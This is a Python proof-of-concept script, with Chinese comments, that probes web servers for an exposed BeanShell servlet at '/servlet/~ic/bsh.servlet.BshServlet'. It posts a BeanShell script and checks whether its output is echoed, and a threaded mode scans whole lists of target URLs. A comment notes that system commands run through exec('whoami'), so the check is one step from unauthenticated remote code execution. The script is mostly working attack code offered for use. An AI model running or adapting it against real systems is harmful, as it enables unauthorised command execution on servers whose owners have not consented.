#!/usr/bin/python3
# coding: utf-8
'''
执行命令用exec("whoami")
'''
import random
import argparse
import urllib3
import requests
import threadpool
urllib3.disable_warnings()
  
def poc(url):
    randomlength=16
    random_str = ''
    base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
    length = len(base_str) - 1
    for i in range(randomlength):
      random_str += base_str[random.randint(0, length)]
    url = url+"/servlet/~ic/bsh.servlet.BshServlet"
    cookies = {"JSESSIONID": "F62A3CA99569DD724EF70F6F9357B34D.server"}
    headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:86.0) Gecko/20100101 Firefox/86.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://49.7.211.56:8888", "Connection": "close", "Referer": "http://49.7.211.56:8888/servlet/~ic/bsh.servlet.BshServlet", "Upgrade-Insecure-Requests": "1"}
    data = {"bsh.script": "print(\""+random_str+"\");\r\n"}
    try:
        r=requests.post(url, headers=headers, cookies=cookies, data=data)
        if random_str in r.text:
            print('\033[1;45m [+]找到BeanShell!地址为: '+url+' \033[0m')
    except Exception as e:
        #print(e)
        pass
def run(filename,pools=10):
    works = []
    with open(filename, "r") as f:
        for i in f:
            target_url = [i.rstrip()]
            works.append((target_url, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(poc, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()

def usage():
    print("Usage:python3 poc.py -u url")
    print("Usage:python3 poc.py -f url.txt")
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u",
                        "--url",
                        help="Target URL; Example:http://ip:port")
    parser.add_argument("-f",
                        "--file",
                        help="Url File; Example:url.txt")
    args = parser.parse_args()
    url = args.url
    file_path = args.file
    if url != None and file_path ==None:
        poc(url)
    elif url == None and file_path != None:
        run(file_path, 10)
if __name__ == '__main__':
    usage()
    main()
